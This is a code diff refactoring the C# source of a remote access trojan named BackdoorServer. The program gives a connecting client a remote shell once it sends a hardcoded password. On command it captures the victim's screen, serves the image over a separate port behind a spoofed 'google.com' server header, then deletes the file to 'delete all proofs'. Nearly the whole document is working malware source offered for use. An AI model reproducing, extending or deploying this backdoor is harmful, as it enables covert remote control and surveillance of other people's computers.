@@ -7,6 +7,7 @@ using System.IO;
 using System.Text;
 using System.Drawing;
 using System.Windows.Forms;
+using RAT;
 
 namespace BackdoorServer
 {
@@ -14,17 +15,17 @@ namespace BackdoorServer
     {
         TcpListener listener;
         Socket socket;
-        int port { get; set; }
-        string serverName { get; set; }
-        string password { get; }
-        bool verbose = true;
         Process shell;
         StreamReader fromShell;
         StreamWriter toShell;
         StreamReader inStream;
         StreamWriter outStream;
-        // reading and sending shell output to the client
-        Thread shellThread;
+        Thread shellReaderThread;
+
+        int port { get; set; }
+        string serverName { get; set; }
+        string password { get; }
+        bool verbose { get; set; }
 
         public Backdoor(int port = 1337, string serverName = "RAT", string password = "P455wD", bool verbose = true)
         {
@@ -51,17 +52,16 @@ namespace BackdoorServer
                 outStream = new StreamWriter(s, Encoding.ASCII);
                 outStream.AutoFlush = true;
 
+                outStream.WriteLine("Pswd:");
                 string checkPass = inStream.ReadLine();
 
                 if (verbose) Console.WriteLine("Client tried password " + checkPass);
-
                 if (!checkPass.Equals(password))
                 {
                     if (verbose) Console.WriteLine("Incorrect Password");
                     DropConnection();
                     return;
                 }
-
                 if (verbose) Console.WriteLine("Password Accepted.");
 
                 StartShell();
@@ -95,12 +95,12 @@ namespace BackdoorServer
             toShell.AutoFlush = true;
 
             // start sending output to the user
-            shellThread = new Thread(new ThreadStart(SendShellOutput));
-            shellThread.Start();
+            shellReaderThread = new Thread(new ThreadStart(SendShellOutput));
+            shellReaderThread.Start();
 
             // welcome message
-            outStream.WriteLine(AlignCenter("  Welcome to " + serverName + " RAT  ", 80, '='));
-            outStream.WriteLine(AlignCenter("  SINGLE-USER MODE  ", 80, '='));
+            outStream.WriteLine("  Welcome to " + serverName + " RAT  ".AlignCenter(80, '='));
+            outStream.WriteLine("  SINGLE-USER MODE  ".AlignCenter(80, '='));
 
             InputLoop();
         }
@@ -112,7 +112,7 @@ namespace BackdoorServer
             {
                 outStream.WriteLine(buffer + "\r");
 
-                // temporary, for logging to screen
+                // temporary, for logging
                 Console.ForegroundColor = ConsoleColor.Cyan;
                 Console.WriteLine(buffer);
                 Console.ResetColor();
@@ -134,19 +134,21 @@ namespace BackdoorServer
         {
             switch (command)
             {
-                case Actions.SCREENSHOT:
+                case RatAction.SCREENSHOT:
                     if (verbose) outStream.WriteLine("Taking a screenshot...");
-                    string path = MakeScreenshot();
+                    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "ppppp.png");
+                    WindowsHelper.MakeScreenshot(path);
+
                     Console.WriteLine("Image is hosted at port 2790");
                     outStream.WriteLine("Image is hosted at port 2790");
-                    HostScreenShot(path);
+                    HostImage(path);
                     Console.WriteLine("Image Sent < OK > !");
                     // delete all proofs
                     File.Delete(path);
                     Console.WriteLine("Image deleted");
                     if (verbose) outStream.WriteLine("Screenshot downloaded and deleted successfully!");
                     break;
-                case Actions.QUIT:
+                case RatAction.QUIT:
                     outStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
                     CloseShell();
                     break;
@@ -156,10 +158,10 @@ namespace BackdoorServer
             }
         }
 
-        void HostScreenShot(string path)
+        void HostImage(string path)
         {
             string responseHeaders =
-                "HTTP/1.1 200 The file is coming right up!\r\n" +
+                "HTTP/1.1 200 OK\r\n" +
                     "Server: google.com\r\n" +
                     "Content-Length: " + new FileInfo(path).Length + "\r\n" +
                     "Content-Type: image/png\r\n" +
@@ -169,7 +171,7 @@ namespace BackdoorServer
             //headers should ALWAYS be ascii. Never UTF8
             var headerBytes = Encoding.ASCII.GetBytes(responseHeaders);
 
-            var lstr = new TcpListener(IPAddress.Any, Actions.SCREENSHOT_PORT);
+            var lstr = new TcpListener(IPAddress.Any, RatAction.SCREENSHOT_PORT);
             lstr.Start();
             Console.WriteLine("Waiting for client to connect...");
             var webSocket = lstr.AcceptSocket();
@@ -177,27 +179,9 @@ namespace BackdoorServer
             webSocket.Send(headerBytes);
             webSocket.SendFile(path);
             webSocket.Close();
+            lstr.Stop();
         }
 
-        string MakeScreenshot()
-        {
-            using (Bitmap bmpScreenCapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
-                                            Screen.PrimaryScreen.Bounds.Height))
-            {
-                using (Graphics g = Graphics.FromImage(bmpScreenCapture))
-                {
-                    g.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
-                                     Screen.PrimaryScreen.Bounds.Y,
-                                     0, 0,
-                                     bmpScreenCapture.Size,
-                                     CopyPixelOperation.SourceCopy);
-
-                    string savePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "ppppp.png");
-                    bmpScreenCapture.Save(savePath);
-                    return savePath;
-                }
-            }
-        }
 
         void DropConnection()
         {
@@ -218,10 +202,10 @@ namespace BackdoorServer
                     shell.Close();
                     shell.Dispose();
                 }
-                if (shellThread != null)
+                if (shellReaderThread != null)
                 {
-                    shellThread.Abort();
-                    shellThread = null;
+                    shellReaderThread.Abort();
+                    shellReaderThread = null;
                 }
                 toShell.Dispose();
                 fromShell.Dispose();
@@ -230,17 +214,6 @@ namespace BackdoorServer
                 DropConnection();
             }
             catch (Exception) { }
-        }
-
-        public static string AlignCenter(string source, int finalLength, char padChar = ' ')
-        {
-            StringBuilder sb = new StringBuilder();
-            for (int i = 0; i < finalLength / 2 - source.Length / 2; i++)
-            {
-                sb.Append(padChar);
-            }
-            sb.Append(source);
-            return sb.ToString().PadRight(finalLength, padChar);
         }
 
         static void Main(string[] args)
@@ -262,13 +235,6 @@ namespace BackdoorServer
                 }
             }
             catch (Exception) { }
-        }
-
-        private static class Actions
-        {
-            public const string QUIT = "q";
-            public const string SCREENSHOT = "screenshot";
-            public const int SCREENSHOT_PORT = 2790;
         }
     }
 }
